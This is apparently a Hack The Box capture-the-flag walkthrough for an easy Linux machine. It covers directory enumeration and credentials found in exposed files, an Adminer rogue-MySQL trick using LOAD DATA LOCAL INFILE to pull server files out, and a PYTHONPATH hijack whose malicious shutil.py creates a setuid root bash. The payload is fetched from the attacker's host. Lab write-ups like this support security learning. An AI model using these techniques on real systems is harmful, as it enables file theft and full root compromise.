
## ## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
**Tags:** `ftp`, `adminer`, `mysql`, `pythonpath`, `privesc`, `path hijack`

---

## 📡 Recon

### Full TCP Port Scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.187
```

### Service and Script Scan

```bash
nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.187
```

---

## 🌐 Web Enum [HTTP](HTTP.md)

### robots.txt

```bash
curl http://10.10.10.187/robots.txt
```

- Found `/admin-dir` → 403 Forbidden
- Mention of username: **waldo**

### Gobuster on `/`

```bash
gobuster dir -u http://10.10.10.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 -o scans/gobuster-root-medium-php
```

### Gobuster on `/admin-dir`

```bash
gobuster dir -u http://10.10.10.187/admin-dir \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,zip,html -t 20 -o scans/gobuster-admindir
```

- Found: `contacts.txt`, `credentials.txt`

---

## 📁 Sensitive Files

### contacts.txt

```bash
curl http://10.10.10.187/admin-dir/contacts.txt
```

### credentials.txt

```bash
curl http://10.10.10.187/admin-dir/credentials.txt
```

- FTP creds: `ftpuser : %n?4Wz}R$tTF7`

---

## 📤 FTP Access

```bash
wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187
```

- Files: `dump.sql`, `html.tar.gz`

### Extract and Analyze Code

```bash
tar -xzf html.tar.gz
```

Look for:
- `utility-scripts/`
- `w4ld0s_s3cr3t_d1r/`

#### Database Credentials Found

From `index.php` / `db_admin.php`:
```php
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A\"d6b";  # backup creds
$password = "&<h5b~yK3F#{PaPB&dA}{H>";  # live creds
```

---

## 💽 Adminer Exploit for File Read

Visit:
```text
http://10.10.10.187/utility-scripts/adminer.php
```

### Setup Local MySQL for Remote Read

```sql
GRANT ALL PRIVILEGES ON *.* TO root@'10.10.10.187' IDENTIFIED BY '0xdf' WITH GRANT OPTION;
```

```sql
CREATE DATABASE pwn;
USE pwn;
CREATE TABLE exfil (data VARCHAR(256));
```

### In Adminer

Connect to local MySQL using:
- Host: your IP
- User: `root`
- Pass: `0xdf`
- DB: `pwn`

Then execute:
```sql
LOAD DATA LOCAL INFILE '/var/www/html/index.php' 
INTO TABLE exfil
FIELDS TERMINATED BY "\n";
```

View results:
```sql
SELECT * FROM exfil;
```

---

## 🔑 SSH as Waldo

```bash
sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh waldo@10.10.10.187
```

✅ Grab `user.txt`

---

## 🧑‍🔧 Privilege Escalation: Python Path Hijack

### Check Sudo Rights

```bash
sudo -l
```

- Can run: `/opt/scripts/admin_tasks.sh` with `SETENV`
- Calls: `/opt/scripts/backup.py` → uses `shutil`

### Exploit Plan

1. Create malicious `shutil.py` in writable dir.
2. Set `PYTHONPATH` to load it.
3. Hijack `make_archive()` to run as root.

### Payload: `shutil.py`

```python
#!/usr/bin/python3
import os

def make_archive(a, b, c):
    os.system("cp /bin/bash /var/tmp/rootbash; chmod +s /var/tmp/rootbash")
```

### Upload & Trigger

```bash
cd /var/tmp
wget http://<your-ip>/shutil.py
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
```

### Spawn Root Shell

```bash
/var/tmp/rootbash -p
```

✅ Grab `root.txt`